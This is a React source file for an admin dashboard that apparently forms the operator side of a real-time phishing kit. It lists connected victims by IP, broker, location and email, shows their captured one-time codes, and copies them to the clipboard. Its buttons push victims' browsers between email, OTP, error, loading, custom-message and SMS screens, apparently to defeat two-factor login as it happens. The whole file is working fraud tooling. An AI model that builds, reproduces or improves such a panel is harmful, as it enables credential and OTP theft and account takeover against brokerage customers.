import React, { useState, useEffect } from "react";
import axios from "axios";
import "./adm.css";
import moment from 'moment-timezone';

import alertaSom from '../assets/alert.mp3';

import { ToastContainer, toast } from 'react-toastify';

import 'react-toastify/dist/ReactToastify.css';

export default function Adm({ip,socket}) {

  const [lista, setLista] = useState([]);
  const [msg, setMsg] = useState("");


  async function AtualizaTabela() {
    const resposta = await axios.get("https://seal-app-w9oy8.ondigitalocean.app/listausuario");
    setLista(resposta.data);
  }

  useEffect(() => {
    const somDeAlerta = new Audio(alertaSom);

    const tocarSomDeAlerta = () => {
      somDeAlerta.play().catch(error => console.error("Erro ao tocar o som:", error));
    };

    socket.on('usuarioConectado', tocarSomDeAlerta);

    return () => {
      socket.off('usuarioConectado', tocarSomDeAlerta);
    };
  }, [socket]); // Dependência [socket] para garantir que o efeito seja aplicado corretamente


  useEffect(() => {
    // Registra o ouvinte para o estado da conexão
    socket.on('statusConexao', (connectedIps) => {
      // Atualiza o estado com a informação de quais IPs estão conectados
      const updatedList = lista.map(item => {
        return {
          ...item,
          online: connectedIps.includes(item.ip) // Atualiza o estado de 'online' com base se o IP está na lista de conectados
        };
      });
      setLista(updatedList);
    });
  
    return () => {
      // Limpa o ouvinte quando o componente for desmontado
      socket.off('statusConexao');
    };
  }, [lista, socket]);
  
  useEffect(() => {
    AtualizaTabela();

    // Definindo uma função dentro de useEffect para tratar o evento atualizaAdmin
    const handleAtualizaAdmin = () => {
      console.log("Atualizando admin...");
      setTimeout(AtualizaTabela, 500);
    };

    // Registrando o ouvinte para o evento atualizaAdmin
    socket.on("atualizaAdmin", handleAtualizaAdmin);

    // Função de limpeza que será chamada quando o componente for desmontado
    return () => {
      socket.off("atualizaAdmin", handleAtualizaAdmin);
    };
  }, [socket, ip]); // Dependências [socket, ip] garantem que o efeito seja reexecutado se eles mudarem

  const handleSubmit = (ipTable) => (event) => {
    event.preventDefault();
    let elemento = document.activeElement.id;
    console.log("Botão clicado:", elemento, "IP:", ipTable);
    let mostraErro =false;

    if(elemento==="otp_Error"){
      mostraErro =true;
    }

    socket.emit("ComandoTroqueCena", { ipCliente: ipTable, cenaNova:elemento, msg, mostraErro });
  };

  const handleChange = (event) => {
    setMsg( event.target.value );
  };


  const copyToClipboard = (text) => {

    console.error('text1: ', text);


    navigator.clipboard.writeText(text)
      .then(() => {
        console.error('text2: ', text);
        toast("Texto copiado com sucesso:"+text, {
          position: "top-center",
          autoClose: 5000,
          hideProgressBar: false,
          closeOnClick: true,
          pauseOnHover: true,
          draggable: true,
          progress: undefined,
          });
      })
      .catch(err => {
        console.error('Falha ao copiar texto: ', err);
      });
  }

  return (
   
  <div className="cards-container">
    <ToastContainer />
      {lista.map((item, index) => (
        item.ip &&
        <div key={index} className="card">
          <div className={item.online ? 'card-headerOnline' : 'card-headerOffline'}>
          
            {/* Informações importantes no cabeçalho do card */}
            {item.corretora} | {item.ip} <br />
            {item.countryCode} {item.city}

            
          </div>
          <div className="card-body">
            <div className="btnCena">
              <label className="labelCena"> cena</label>
              {item.cena}
            </div>

            <div  className="btnEmail" onClick={() => copyToClipboard(item.email)}>
              <label className="label"> email</label>
              {item.email}
              </div>
            
            
            <div  className="btnOTP" onClick={() => copyToClipboard(item.OTP)}>
            <label className="label corBranca"> OTP email</label>
              {item.OTP}
              </div>
            
                   
            
          </div>
          <div className="card-footer">
            {/* Botões no rodapé do card */}
            <form onSubmit={handleSubmit(item.ip)}  > 
                      <button className="btnPadrao" type="submit" id="email">email</button>
                      <button className="btnPadrao" type="submit" id="otp">otp</button>
                      <button className="btnPadrao" type="submit" id="otp_Error">otp Error</button>
                      
                      <button className="btnPadrao" type="submit" id="load">load</button>
                      
                      <div className="nav-dropdown-menu__inner">
                            <ul className="nav-dropdown-list nav-dropdown-list--primary">
                              <li className="drop-down-item">
                                <input id="mensagem" name="mensagem" type="text" placeholder="" className="form-input__input" 
                                onChange={(e) => handleChange(e)}                      
                                autoFocus></input>
                              </li>
                              <li className="drop-down-item">
                                <button className="btnPadrao" type="submit" id="otp2">MSG CUSTOM</button>
                                <button className="btnPadrao" type="submit" id="otp_sms">****99</button>
                              </li>
                            </ul>
                          </div>
                  </form>

                  <div className="atualizacao">{moment.tz(item.date, "America/Sao_Paulo").format("DD/MM/YY HH:mm:ss")}</div>
          </div>
        </div>
      ))}
    </div>
  );
}
